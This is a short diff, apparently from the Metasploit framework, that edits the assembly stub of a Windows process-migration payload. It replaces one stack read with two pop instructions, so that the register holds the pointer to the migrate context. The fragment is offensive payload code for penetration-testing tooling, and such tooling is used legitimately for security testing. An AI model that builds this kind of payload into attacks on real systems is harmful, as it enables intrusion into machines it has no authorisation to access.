@@ -34,7 +34,8 @@ module Payload::Windows::MigratePipe
     asm = %Q^
     migrate:
       cld
-      mov esi, [esp+4]
+      pop esi
+      pop esi                   ; esi now contains a pointer to the migrate context
       sub esp, 0x2000
       call start
       #{asm_block_api}
